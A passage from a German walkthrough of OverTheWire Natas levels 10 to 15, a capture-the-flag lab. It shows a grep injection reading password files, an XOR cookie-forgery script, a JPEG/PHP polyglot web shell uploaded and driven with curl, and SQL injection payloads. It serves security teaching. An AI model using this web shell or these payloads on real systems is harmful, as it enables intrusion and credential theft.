`grep` gibt Inhalte aus, die mit dem Suchbegriff übereinstimmen. `-i` ignoriert dabei Groß- und Kleinschreibung in den Patterns. Zuletzt wird der Suchbegriff übergeben und mit der Datei `dictionary.txt` verglichen.


Gib im Eingabefeld folgenden Suchbegriff ein:

```text
a /etc/natas_webpass/natas11
```

Oder mach es über das Terminal mit:

```bash
curl -u "natas10:Passwort" "http://natas10.natas.labs.overthewire.org/?needle=a%20/etc/natas_webpass/natas11&submit=search" > natas11.txt

cat natas11.txt | grep natas11
```

Anschließend solltest du das Passwort für die nächste Challenge erhalten.

![Natas11 Password](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas11c.png)


### Erkenntnisse - Command Injection-Bypass (Logik-Fehler)

- **Schwache Blacklist-Filter:** Das Filtern von gefährlichen Zeichen (`;`, `|`, `&`) ist unzureichend, wenn andere **Shell-Konstrukte** verwendet werden können.

- **Ausnutzung des `grep`-Befehls:** Die Schwachstelle liegt nicht im Trennen des Befehls, sondern im **Ausnutzen** der `grep`-Syntax: Durch das Einfügen eines Leerzeichens vor einem neuen Pfad kann `grep` dazu gebracht werden, die **Ausgabe einer Systemdatei** anzuzeigen (`grep -i a /etc/...`).

</details>




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Natas 11 -> 12

**Aufgabe:** Finde das Passwort.

```text
Username:   natas11

URL:        http://natas11.natas.labs.overthewire.org
```


<details>
    <summary>Lösung</summary>

Mit dem Zugang zu `natas11` bekommst du eine komplett neue Challenge. Du erhältst bereits im Vorfeld einen Hinweis darauf, wie die Cookies geschützt sind, nämlich mit einer `XOR`-Verschlüsselung.

![Natas12 Startseite](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas12.png)

Es handelt sich hierbei jedoch um eine sehr einfache kryptografische Operation, die auf binärer Exklusiv-Oder (XOR) Logik basiert.

Schau auf den Sourcecode, um näheres darüber zu erfahren, was im Backend mit den Daten geschieht.


![Natas12 Sourcecode Analyse](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas12b.png)



Wenn du dich durch den Sourcecode liest, dann erkennst du 3 Funktionen.

1. `xor_encrypt($in)` - die für die XOR-Verschlüsselung zuständig ist.
2. `loadData($def)` - die für das laden des Default-Werts ist.
3. `saveData($d)` - die für das Speichern der Daten ist.

Die `xor_encrypt`-Funktion scheint interessant zu sein, da du darüber die Entschlüsselung vornehmen kannst.

Es ist jedoch wichtig, den exakten Schlüssel zu kennen, damit der Klartext korrekt ausgegeben werden kann. Leider wird er im Code zensiert (`<censored>`).

Der Sourcecode verrät, dass eine neue Variable `$data` mit dem Wert aus der Funktion `loadData($defaultdata)` initialisiert wird. Daraufhin wird geprüft, ob sich in diesem Array ein Parameter mit besonderem Wert `preg_match('/^#?:[a-f\d]{6})...` befindet, was auf den Inhalt des Eingabfelds (`#ffffff`) auf der Hauptseite von `natas11` hindeutet. 

In dieser Funktion ist auch eine sogenannte *Superglobal* aus der `PHP`-Syntax, nämlich `$_COOKIE`. Ein Superglobal (`$_COOKIE`, `$_REQUEST`, usw.) ist ein vordefinierter Array, der vom PHP-Interpreter gefüllt wird und dir Zugriff auf Daten gibt, die von einem Client (dem Browser) an den Server gesendet werden.

Die Variable `$_Cookie` enthält also die Daten, die der Browser im `Cookie`-Header der HTTP-Anfrage an den Server sendet.

Die Funktion `loadData()` verarbeitet somit den gesamten Inhalt der Variable `$_COOKIE`, insbesondere `['data']`.   
Gleichzeitig ist diese Funktion für die Logik der Seite zuständig, was bedeutet, dass die Manipulation des Cookies den ursprünglichen Aufbau der Hauptseite verändern könnte (sofern keine weiteren besonderen Sicherheitsmaßnahmen vorhanden sind - was bei `natas11` der Fall ist). 

Die 3. Funktion `saveData()` speichert den eingegebenen Wert aus dem Cookie und übergibt ihn an den Server, um ihn zu speichern.   
Also musst du versuchen, den Cookie so zu modifizieren, dass der Server die Nachricht erhält, den Parameter auf `"showpassword":"yes"` zu setzen.

Wie der Inhalt formatiert und verschlüsselt wird, ist am einfachsten in der Funktion `safeData()` zu sehen, wo der gesamte String (hier `$defaultdata`) zuerst ins kompakte JSON-Format gebracht (`json_encode()`), dann mit der Funktion `xor_encrypt()` XOR verschlüsselt und anschließend mit Base64 kodiert wird.

In der letzten `if`-Bedingung wird überprüft, ob der Parameter `"bgcolor"` existiert. Dies geschieht über den Superglobal-Array `$_REQUEST`. 

`$_REQUEST` ist eine Kombination aus aller Eingabedaten, die ein Benutzer an den Server schicken kann. Es ist quasi ein *Super-Superglobal*, da es normalerweise die Inhalte von drei anderen Superglobals enthält (`$_GET`+`$_POST`+`$_COOKIE`=`$_REQUEST`).

```text
$_REQUEST = $_GET + $_POST + $_COOKIE
```

- `$_GET`sind die Daten aus der URL-Abfragezeichenkette (z.B. `?bgcolor=%23ffffff`).   
- `$_POST` sind Daten aus dem Body einer HTTP-Post-Anfrage (z.B. nach dem Absenden eines Formulars).   
- `$_COOKIE` sind die bereits erwähnten Cookie-Daten.

**Sicherheitsrisiko des Superglobal `$_REQUEST`:**   

Aus Sicht der IT-Sicherheit deutet ein `$_REQUEST` Superglobal im Code daraufhin, dass die Entwickler keine gute Arbeit geleistet haben. Das Problem liegt darin, dass in einem `$_REQUEST` nicht unterschieden wird, ob die Daten per URL, Cookie oder Formular übermittelt werden. In einem Sicherheitskontext kann die Verwendung von `$_REQUEST` bedeuten, dass du eine Schwachstelle auf verschiedene Wege ausnutzen kannst (z.B. eine Cookie-basierte Schwachstelle kann plötzlich auch über einen einfachen URL-Parameter ausgelöst werden).

Schau dir jetzt einmal den Cookie an.   
Geh in den Dev-Tools deines Browser in den Reiter Netzwerk und lade ggfs. die Seite über den Button `reload` neu.

![Natas12 DevTools Netzwerk Cookie Analyse](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas12c.png)

Klicke auf die Datei mit dem `Initiator` `document` bzw. dem `Type` `html`. Das ist die Hauptseite.   
Schau dir den Cookie an. Neben den Google Analytics Parametern (`_ga_`), die für einen Payload unbedeutend sind, steht der Cookie Wert `data` mit einem, so wie es aussieht Base64 kodiertem Inhalt.

Mir kam dann die Idee, eine KI anzuleiten ein Skript zu schreiben welches mir den potenziellen XOR-Schlüssel ausgibt. 

Du kennst zwar nicht den korrekten Schlüssel, doch in einer einfachen binären Logik kannst du den Klartext, den du über den Sourcecode erhältst, mit dem verschlüsselten Wert vergleichen und so vielleicht auf den richtigen Schlüssel kommen (du wirst in der realen Welt nicht so einfach an den Klartext kommen).

Die KI half mir daraufhin einen Code zu entwickeln, der den Klartext aus dem Sourcecode nimmt und mit dem Base64-Wert aus dem Cookie vergleicht.

**Wichtig:** Der Inhalt aus der Variablen des Sourcecodes muss im standardmäßigen, kompakten JSON-Format sein. Achte also darauf, dass du keine unnötigen Leerzeichen verwendest, da diese die Byte-Anzahl verändern und die XOR-Entschlüsselung auf Serverseite fehlschlagen lassen.

Das korrekte, kompakte JSON-Format sieht wie folgt aus: `{"showpassword":"yes", "bgcolor":"#ffffff"}`.

Achte deshalb darauf, den Wert im nachfolgenden Python Code in der Variable `KNOWN_PLAINTEXT_STR` exakt in einem JSON-Format darzustellen.

<details>
    <summary>Python Code für den XOR-Schlüssel</summary>

```python
import base64
import json
from itertools import cycle

# 1. Bekannte Daten definieren
# ACHTUNG: Die JSON-Struktur, die der Server standardmäßig verarbeitet
KNOWN_PLAINTEXT_STR = '{"showpassword":"no", "bgcolor":"#ffffff"}'

# Der verschlüsselte Cookie-Inhalt (Chiffretext)
# Aktualisiere den Inhalt wenn nötig
ENCRYPTED_COOKIE = "HmYKbwozJw4WNYAAFyB1VUcqOE1JZUIBis7ABdmbU1GlJjEJAyIXTrg="

# --- Datentransformation ---

# Klartext muss als Bytestring vorliegen
P = KNOWN_PLAINTEXT_STR.encode('utf-8')

# Chiffretext: Base64-Dekodierung des Cookie-Strings in binäre Daten
C = base64.b64decode(ENCRYPTED_COOKIE)

# Prüfen, wie lang der Schlüssel maximal sein könnte. 
# Wir nehmen die kürzere Länge der beiden Strings für die erste Analyse.
max_analysis_len = min(len(P), len(C)) 

# --- XOR-Berechnung zur Schlüsselbestimmung ---
# Das Ergebnis der XOR-Operation (C ^ P) ist der Schlüssel K

key_bytes = bytearray()

# XOR-Operation Byte für Byte
for i in range(max_analysis_len):
    # K[i] = C[i] XOR P[i]
    key_byte = C[i] ^ P[i]
    key_bytes.append(key_byte)

# --- Analyse und Ausgabe ---

print("--- XOR-Schlüsselanalyse (Known-Plaintext) ---")
print(f"Länge Klartext (JSON): {len(P)} Bytes")
print(f"Länge Chiffretext (Binär): {len(C)} Bytes\n")

# Der resultierende Key-String, der das sich wiederholende Muster enthält
result_key_str = key_bytes.decode('ascii', errors='replace')

print(f"Kandidat für den sich wiederholenden Schlüssel: {result_key_str}")

# Jetzt muss das Muster im Kandidaten identifiziert werden (z.B. ein kurzes Wort, das sich wiederholt)
# Suche nach dem kleinsten sich wiederholenden Muster im resultierenden String, 
# welches den tatsächlichen, kurzen XOR-Schlüssel darstellt.

# Da der Schlüssel kurz ist, betrachten wir nur die ersten 16 Bytes
print("\nDie ersten 16 Bytes des XOR-Ergebnisses (Rohdaten):")
print(key_bytes[:16])

# Die Lösung liegt im Muster der ersten Bytes! 
# Sobald du das Muster siehst, hast du den Schlüssel K gefunden.
# Führe das Skript aus und identifiziere den kurzen, sich wiederholenden Schlüssel.

```

</details>



Wenn du dieses Skript ausführst, dann solltest du den XOR-Schlüssel erhalten haben.   

> Es kann sein, dass die Passwörter aktualisiert worden sind.

![Natas12 XOR-Schlüssel](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas12d.png)

Nun hast du den Schlüssel und kannst damit versuchen den manipulierten JSON-String an den Server zu übermitteln.

Wichtig ist dabei, dass du die Reihenfolge zum Verschlüsseln richtig einhältst.   
Zuerst den String ins kompakte JSON-Format bringen, dann mit dem richtigen Schlüssel XOR verschlüsseln und zum Schluss den gesamten String Base64 kodieren.

Dazu gehst du auf [cyberchef.io](https://cyberchef.io). Hier kannst du dein eigenes Verschlüsselungsrezept einstellen. Du benötigst nur 2 Methoden, da du den String so eingibst, dass er bereits im kompakten JSON-Format ist, sodass du ihn direkt XOR verschlüsseln und Base64 kodieren kannst.

![Natas12 Cyberchef Verschlüsselung](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas12e.png)

Die Navigation auf cyberchef.io ist relativ simpel und funktioniert im Drag&Drop-Prinzip. Du hast links die `Operations`, in der du die unterschiedlichen Algorithmen erkunden kannst. In der Mitte hast du `Receipe`, in das du deine "Rezepte" aus den Operations hineinziehen kannst, die dann Wunder bewirken. Rechts siehst du einmal oben den `Input`, in das du deinen String eingibst, mit dem dann etwas Gewisses passieren soll (je nach deinem Rezept) und im rechten unteren Bildschirm siehst du den `Output`, also die Ausgabe und somit das Resultat deiner Berechnung.

In der Spalte `Receipe` siehst du ganz unten normalerweise einen `Bake`-Button, der für dich dann die Arbeit macht. Du kannst neben diesem Button zusätzlich den Haken auf `Auto Bake` setzen, sodass alles automatisch passiert.

Achte darauf, folgende Rezepte zu verwenden:

1. XOR mit dem richtigen Schlüssel aus dem Skript. Kritisch: Das Output-Format der XOR-Operation muss auf `UTF-8` oder `Latin1` eingestellt werden!

2. To Base64

3. (Optional) URL Encoding


Kopiere den String, den du erhältst und öffne dein Terminal (ich nutze die Kali Distribution).

Gib in deinem Terminal folgenden Befehl ein:
```bash
curl -u natas11:<deinPassword> \
-b "data=DeinVerschlüsselterString" \
-L "http://natas11.natas.labs.overthewire.org/" -v -i # optional sind -v -i
```

![Natas12 cURL mit dem modifizierten Header](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas12f.png)

**Was macht der `curl`-Befehl im Detail:**
- `-u` oder `--user`: steht für User und wird zur Authentifizierung gentzt. Dieser Header generiert aus der Syntax `username`:`password` einen Basic verschlüsselten String.
- `-b`: dieser Switch weist `curl` an, die Daten `data=DeinVerschlüsselterString` an den HTTP-Header `Cookie` zu senden und ist somit der kritischste Teil des Exploits.
- `-L` oder `--location`: bedeutet, dass `curl` Redirects folgen sollen. Also, wenn nach der Authentifizierung eine Weiterleitung (z. B. `302`) an die eigentliche Seite geschickt wird. 


Sobald du diesen Befehl ausführst, solltest du das Passwort inmitten der HTML-Ausgabe über `cURL` erhalten.

![Natas12 Password](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas12g.png)


Herzlichen Glückwunsch, du hast das Passwort zu `natas12` erfolgreich herausgefunden und kannst mit dem nächsten Level weitermachen.


### Erkenntnisse - Known-Plaintext-Angriff (XOR)

- **Sicherheit durch Obskurität:** Das Cookie wird mit **XOR-Verschlüsselung** geschützt, was eine sehr schwache Methode darstellt.

- **Known-Plaintext-Angriff (KPA):** Da der Klartext (`{"showpassword":"no", "bgcolor":"#ffffff"}`) und der Chiffretext (das Cookie) bekannt sind, kann der kurze XOR-Schlüssel durch einfache XOR-Operation (`Chiffretext + Klartext = Schlüssel`) ermittelt werden.

- **Wichtigkeit der kompakten JSON-Struktur:** Leerzeichen im Payload führen zu falschen Byte-Größen und **falschen XOR-Berechnungen**, was die genaue Einhaltung des **kompakten JSON-Formats** (`{"key":"value","key2":"value2"}`) erfordert.

</details>


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Natas 12 -> 13

**Aufgabe:** Unrestricted File Upload

```text
Username:   natas12

URL:        http://natas12.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

Mit `natas12` erhältst du die Challenge, eine Schwachstelle im Bereich der unsicheren Datei-Uploads (**Unrestricted File Upload**) auszunutzen. Diese Schwachstelle erlaubt es Angreifern, ausführbare Dateien hochzuladen, indem sie serverseitige Validierungen umgehen. Es handelt sich hierbei um einen Datei-Upload-Bypass.

Das Verfahren wird in diesem Level verdeutlicht. 

Nachdem du dich eingeloggt und auf der Upload-Seite der Webanwendung bist, wird dir die Möglichkeit gewährt, eine Datei hochzuladen.

Über `view source code` (normalerweise erreichbar über die Entwicklertools des Browsers) gelangst du hinter den Source Code der PHP-Anwendung.

Der Source Code hat mehrere Funktionen, die ausgelöst werden, wenn A. die Seite lädt (z.B. `genRandomString()`) und B. bei Upload einer Datei.


<details>
    <summary>Source Code ansehen:</summary>
    
![natas12 Source Code](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas13b.png)

</details>


**Serverseitige Validierungen**

Die Anwendung führt beim Upload mehrere Prüfungen durch, die umgangen werden müssen:

- **Dateigröße:** Die hochgeladene Datei muss kleiner als `1000 Bytes` sein, bevor die Fehlermeldung "`File is too big`" ausgegeben wird.

- **Dateiname (Endungsprüfung):** Die serverseitige Logik generiert einen zufälligen String und hängt die Endung (`.jpg` oder `.jpeg`) an, z.B. über Funktionen wie `pathinfo()`. Du musst diese Prüfung überlisten, um eine ausführbare Endung zu speichern.

- **Dateisignatur (Inhaltsprüfung):** Der Server prüft wahrscheinlich, ob die Datei einen gültigen Header (bekannt als **Magic Bytes** oder **File Signature**) für ein Bildformat enthält, bevor er sie speichert.

Es reicht nicht, eine normale `.jpeg`-Datei hochzuladen. Du musst eine sogenannte **Polyglot-Datei** erstellen, die den Header eines gültigen `JPEG`-Formats enthält, sowie einen `PHP`-Befehl, mit dem du Shell-Befehle auf dem Server ausführen kannst.

Unter [WikiPedia: List of File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) erhältst du die Signaturen, die für die Dateien bestimmt sind - auch bekannt unter `magic numbers`. 

Es gibt zwei Möglichkeiten:
- Entweder du hast oder lädst dir eine `JPEG`-Datei herunter, in die du dann deinen `PHP`-Schadcode hinzufügst.
- Oder du erstellst die Datei komplett neu mit den unter `Kali Linux` zur Verfügung stehenden Programmen.

Ich zeige dir letzteres.

**1. Datei für Unrestricted File Upload erstellen**

Um ein Bild zu erstellen, dem du ein `JPEG`-Header hinzufügst, eine Datei mit einem `PHP`-Payload erstellst und die beiden Dateien zu einer `JPEG`-Datei kombinierst, gibst du folgendes in dein Terminal ein:

```bash
# 1. Binären JPEG-Header (FF D8 FF E0) in eine temporäre Datei umleiten
echo -n "FFD8FFE0" | xxd -r -p > image_header.bin

# 2. PHP Payload erstellen
# Die Funktion system($_GET["cmd"]) erlaubt das Ausführen von Befehlen über den URL-Parameter 'cmd'.
echo '<?php system($_GET["cmd"]); ?>' > payload.txt

# 3. Polyglot-Datei erstellen (Header + Payload)
# Die Endung (.jpeg) wird hier nur als Platzhalter verwendet, der Bypass erfolgt später im cURL-Befehl.
cat image_header.bin payload.txt > final_exploit.jpeg
```

**Erläuterung oben stehender Befehle:**     
1. `echo -n "FFD8FFE0" | xxd -r -p > dateiname.bin`
    - `echo -n "FFD8FFE0"`: Gibt den Hex-String des `JPEG`-Headers aus, wobei `-n` das abschließende Zeilenumbruchzeichen verhindert.
    - `| xxd -r -p > dateiname.bin`: Die Pipe leitet den String an das `xxd`-Programm weiter, `-r` (Reverse) konvertiert den Hex-String in binäre Bytes, und `-p` (Plain) entfernt die Metadaten von `xxd`.

2. `echo '<?php system($_GET["cmd"]); ?>' > payload.txt`
    - Leitet den `PHP`-Web-Shell-Payload in eine Textdatei.
    - `system($_GET["cmd"])`: Führt einen über den URL-Parameter `cmd`übergebenen Shell-Befehl aus.

3. `cat image.bin payload.txt > finalImage.jpeg`
    - `cat` verkettet die binären Header-Bytes (für die Signaturprüfung) und den Text-Payload (für die Code-Ausführung) und speichert das Ergebnis.

![Natas13 - Datei vorbereiten](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas13d.png)

**2. Datei hochladen und Pfad manipulieren**

Am einfachsten ist es, die Datei mit dem `cURL`-Befehl auf den Server hochzuladen. Beim Upload sind auf folgenden Dinge zu achten:

- Die Header müssen mit dem Source Code übereinstimmen.
    - Wenn im Input steht: `<input type="text" name="UploadFile" ...>`, dann muss bei Dateiupload mit `cURL` dieser String exakt verwenden werden (`-F "UploadFile=...").
- Du lädst auf die `index.php`-Seite, die den Upload bereitstellt.

Lade die Datei mit folgendem Befehl hoch:

```bash
# Beispiel-Befehl für den Trailing-Slash-Bypass
curl -u natas12:passwort \
-F "uploadedfile=@final_exploit.jpeg;type=image/jpeg" \
-F "filename=command.php/" -F "submit=Upload File" \
http://natas12.natas.labs.overthewire.org/index.php
```
**Erläuterung des Bypasses**   
**(`-F "filename=command.php/"`):** Dieser Schritt nutzt einen Fehler in der PHP-Funktion `pathinfo()` (die zur Endungsprüfung verwendet wird) und/oder im Betriebssystem.
- **Validierung:** Die Funktion `pathinfo()` liest die Endung aufgrund des abschließenden Schrägstrichs (`/`) möglicherweise nicht korrekt oder die Prüfung ignoriert den Slash, was den Upload erlaubt.
- **Speicherung:** Das Dateisystem (unter der `move_uploaded_file()`-Funktion) behandelt den Schrägstrich oft als ungültig und speichert die Datei als `randomString.php` (oder `randomString.phtml`), was die Ausführung ermöglicht.


**Wichtig:** Der Dateipfand muss entweder relativ oder absolut angegeben werden, wenn die Datei nicht im gleichen Verzeichnis liegt. Achte deshalb darauf, das alles nach `-F "uploadfile=@` muss so angegeben ist, dass das `cURL`-Programm diese Datei finden kann.

**Ein erfolgreicher Upload gibt dir im Terminalfenster folgendes aus:**   
![Natas13 - Dateiupload via cURL-Befehl](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas13e.png)

Die hochgeladene Datei im Link (rotes Rechteck) kann weiterhin `.jpg` oder eine harmlose Endung sein, da diese vom Server zurückgegeben wird. **Die tatsächliche Endung auf dem Server ist jedoch `.php` (oder eine ähnliche ausführbare Endung) aufgrund des Bypasses.**

Durch den `cURL`-Befehl wurde der Server so manipuliert, dass er die Dateiendung aus dem `cURL`-Befehl `.php` akzeptiert. 

Im letzten Schritt ist es nur noch eine Frage des richtigen `cURL`-Befehls, damit du die richtige Datei ausliest, um an das Passwort von `natas13` zu kommen.

**3. Auslesen des Passworts**

Da der Server die Datei als `.php` akzeptiert, obwohl sie eine `JPEG`-Signatur trägt, kannst du diese Schwachstelle für dich nutzen, um deinen Payload entweder im Browser oder per weiteren `cURL`-Befehl mit einem `cmd=...`-Parameter zu übermitteln. 

**Per `cURL`:**
```bash
curl -u natas12:passwort \
http://natas12.natas.labs.overthewire.org/upload/dateipfad.php?cmd=cat%20/etc/natas_webpass/natas13
```

**Über den Browser:**
```http
natas12.labs.overthewire.org/upload/dateipfad.php?cmd=cat%20/etc/natas_webpass/natas13
```

![Natas13 - Passwort auslesen via Payload](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas13f.png)


Damit hast du das Passwort für `natas13` und kannst mit dem nächsten Level fortfahren.


</details>


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Natas 13 -> 14

**Aufgabe:** Unrestricted File Upload

```text
Username:   natas13

URL:        http://natas13.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

Genau die gleiche Technik wie `natas12`. 


**1. Datei für Unrestricted File Upload erstellen**

Um ein Bild zu erstellen, dem du ein `JPEG`-Header hinzufügst, eine Datei mit einem `PHP`-Payload erstellst und die beiden Dateien zu einer `JPEG`-Datei kombinierst, gibst du folgendes in dein Terminal ein:

```bash
# 1. Binären JPEG-Header (FF D8 FF E0) in eine temporäre Datei umleiten
echo -n "FFD8FFE0" | xxd -r -p > image_header.bin

# 2. PHP Payload erstellen
# Die Funktion system($_GET["cmd"]) erlaubt das Ausführen von Befehlen über den URL-Parameter 'cmd'.
echo '<?php system($_GET["cmd"]); ?>' > payload.txt

# 3. Polyglot-Datei erstellen (Header + Payload)
# Die Endung (.jpeg) wird hier nur als Platzhalter verwendet, der Bypass erfolgt später im cURL-Befehl.
cat image_header.bin payload.txt > final_exploit.jpeg
```

Wenn du die Datei erstellt hast oder die Datei wie zuvor nutzt, dann stelle sicher, dass du den nächsten `cURL`-Befehl wieder im gleichen Verzeichnis ausführst, wo auch die Datei liegt (einfachster Weg). Andernfalls musst du den absoluten Pfad eingeben.

**2. Datei hochladen und Pfad manipulieren**

Die Datei kannst du nun per `cURL`-Befehl auf den Server hochladen. Gib dazu folgendes in dein Terminal ein:

```bash
curl -u natas13:password \
-F "uploadedfile=@deineFile.jpeg;type=image/jpeg" \
-F "filename=shell.php" \  # Name egal, Endung = .php!
-F "submit=Upload File" \
http://natas13.natas.labs.overthewire.org/index.php
```

![Natas14 Datei hochladen](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas14.png)


Du erhältst dann das Verzeichnis (`/upload/`) und den random String als ersetzen Dateinamen. Jedoch muss die Endung `.php` sein.

**3. Passwort auslesen**

Um nun das Passwort auszulesen gibst du im Terminal folgendes ein:

```bash
curl -u natas13:password http://natas13.natas.labs.overthewire.org/upload/deinRandomString.php?cmd=cat%20/etc/natas_webpass/natas14
```

![Natas14 Passwort auslesen](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas14b.png)

Damit hast du das Passwort für `natas14` und kannst mit dem nächsten Level fortfahren.


</details>



## Natas 14 -> 15

**Aufgabe: Boolean based SQL-Injection**

```text
Username:   natas14

URL:        http://natas14.natas.labs.overthewire.org
```

<details>
   <summary>Lösung</summary>

Im `natas14` Level geht es darum, per **SQL Injection** (**SQLi**) die Authentifizierungsprüfung der Webanwendung zu umgehen, um das Passwort für die nächste Challenge (`natas15`) zu erhalten.

Bei SQL-Injections ist es entscheidend, die verwendete Datenbank-Engine und die genaue **Syntax der Query-Konstruktion** zu kennen. In diesem Fall handelt es sich um eine **MySQL**/**MariaDB-Datenbank** (erkennbar an der `mysqli_connect()`-Funktion).

Außerdem solltest du mit Tests herausfinden, welchen Wert du wie extrahieren kannst. Dies machst du am einfachsten mit verschiedenen SQL-Injections. Die einfachste Methode und die, die am häufigsten genutzt wird, ist: `' OR 1=1 --` (oder mit `#`, statt `--` auskommentiert). Probiere auch Methoden wie `sleep(x)`, wobei `x` die Sekunden darstellt und lasse die Anwendung eine gewisse Zeit "schlafen". Letzen Endes ist es wichtig zu überprüfen, ob die Datenbank auf SQL-Injections im Allgemeinen anschlägt.

```php
# Beispiel für eine SQL-Injection, die die Ladezeit der Webanwendung um 4 Sekunden verzögert:
" OR SLEEP(4) #
```


**1. Analyse der Schwachstelle**

Über den Source Code hast du Einblick in die kritische, unsichere SQL-Abfrage (vereinfacht dargestellt):

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";

# Resulitierende SQL Query sieht im Prinzip so aus:
"SELECT * from users where username="UserEingabe" and password="PasswortEingabe";
```
Das Problem ist die **fehlende Sanitization** (Bereinigung) der Benutzereingaben, wodurch diese direkt in die SQL-Zeichenkette eingefügt werden.

**Wenn PHP die `$query`-Variable erstellt, interpretiert es die Escapesequenzen:**

- `\"` wird zu einem einzigen doppelten Anführungszeichen (`"`) in der finalen SQL-Abfrage.

Um die SQL-Zeichenkette vorzeitig zu schließen und eigenen Code einzufügen, musst du das Zeichen verwenden, das PHP in die Abfrage eingefügt hat, nämlich das doppelte Anführungszeichen (`"`).

- Deine Eingabe (Username): `"`

- Die Abfrage wird zu (Start des Ausbruchs): `... username="" ...`

**Dein Payload `" OR 1=1 #` funktioniert perfekt, weil:**

- `"`: Schließt das Anführungszeichen von `username="`.

- `OR 1=1`: Injiziert die immer wahre Logik, um die Bedingung zu erfüllen.

- `#`: Kommentiert den Rest der Abfrage (`" AND password="["password"]"`) aus.

Der Ausbruch mit dem doppelten Anführungszeichen (`"`) ist **zwingend notwendig** und liegt allein an der unsicheren Syntax der PHP-Konstruktion der SQL-Abfrage, die `$_REQUEST["username"]` mit **doppelten Anführungszeichen** (`"`) umschließt.


**2. Der Erfolgreiche Bypass: Boolesche Logik**

**So kommst du an das Passwort:**
Gib im Eingabefeld für das Username folgenden Befehl ein und bestätige mit Enter:

```sql
" or 1=1 #
```

**Erläuterung des SQL-Befehls:**
- `"`: Schließt das einleitende Anführungszeichen der `username`-Zeichenkette.

- `OR 1=1`: Eine **boolesche Bedingung**, die immer zu `TRUE` ausgewertet wird. In SQL führt `TRUE` (wahr) in einer `WHERE`-Klausel dazu, dass alle Zeilen der Tabelle zurückgegeben werden. Da die `OR`-Verknüpfung eine höhere Priorität hat als die `AND`-Verknüpfung mit dem Passwort, ist die gesamte `WHERE`-Klausel erfolgreich.

- `#`: Das MySQL-**Kommentarzeichen** (oft in der URL als `%23` kodiert) kommentiert den Rest der ursprünglichen Abfrage (`" AND password="...`) aus.



![Natas15 SQL-Injection](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas15.png)


**2. Passwort für Natas15**

Mit der SQL-Injection solltest du auf der nächsten Seite (`/index.php`) das Passwort erhalten.

![Natas15 Passwort](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas15b.png)


**Das Ganze nur über `BurpSuite`**
![Natas15 BurpSuite SQL-Injection](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas15c.png)


</details>



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>



## Natas 15 -> 16

**Aufgabe:** 

```text
Username:   natas15

URL:        http://natas15.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

In `natas15` ist die Schwachstelle eine **Blind SQL Injection**. Sie wird nicht durch eine Fehlermeldung (`Error-Based`) ausgenutzt, sondern durch einen **Booleschen Indikator** (Boolean-Based). Der Indikator ist die logische Unterscheidung in der Anwendungsausgabe ("`This user exists.`" vs. "`This user doesn't exist.`").

Die Hauptseite beinhaltet ein Eingabefeld, das bei Nutzung den entsprechenden Benutzernamen sucht und bei einem Treffer die Seite `/index.php` mit den Werten "This user exists." oder "This user doesn't exist." lädt.

Der Source Code verrät, dass es eine Datenbank mit dem Namen `users` gibt, in denen die Attribute `username` und `password` gespeichert werden. 

<details><summary>Source Code anzeigen</summary>

![Natas16 SourceCode](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas16b.png)
</details>

Die Nutzung von `$_REQUEST` ist ein Indikator für fehlende Eingabekontrolle (Input Validation). Du muss sowohl `GET` als auch `POST` testen, wobei `POST` die primäre Methode für Formulare ist. Das Risiko ist die fehlende Beschränkung auf eine bestimmte HTTP-Methode.

In meiner virtuellen Umgebung nutze ich Kali für den Exploit-Angriff. Außerdem helfen mir Tools wie `Burp` oder `cURL` dabei, Anfragen an die Server komfortabler zu übermitteln.

Burp nutze ich mit der Firefox-Extension `foxyproxy`, was die Übermittlung der Daten vereinfacht, da ich nicht angewiesen bin auf den internen Browser von Burp.

![Natas16 Burp Suite SQLi](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas16c.png)

**1. Vorbereitung auf den Exploit**

Mit der generellen `' Or 1=1 --` (in Beispiel `natas` mit `"`) Befehlskette kann eine SQL-Injection provoziert werden. Außerdem ist der Ausbruch je nach Datenbank unterschiedlich. Der Ausbruch mit `"` gelingt, weil die SQL-Abfrage die Benutzereingabe mit doppelten Anführungszeichen umschließt (`username=\"".$_REQUEST["username"]."\"`).

**Infos zum Source Code:**

Die `$query`-Variable, die den Select-Befehl deklariert, wird zusammen mit der Datenbankverbindung in einer neuen Variable `$res` deklariert, die anschließend mit der Funktion `mysqli_num_rows()` vergleicht, ob der Wert in `$res` größer als `0` ist.   
Die Logik tritt ein, sobald ein Wert als Resulatat über die Eingabenübermittlung der Hauptseite von der Datenbank zurückgegeben werden kann, weil er in ihr existiert.

Die Datenbank von `natas15` hat nur einen Datensatz und der ist: `natas16`.

Dies bestätigt, dass die Anwendung für **Error-Based SQLi** geschützt ist und der Angreifer gezwungen ist, auf die Boolesche Methode auszuweichen.


**2. Passwortlänge herausfinden**

Da es sich um das gleiche Passwort wie alle `natas`-Level handelt, kannst du davon ausgehen, dass auch hier das Passwort genauso lang ist.

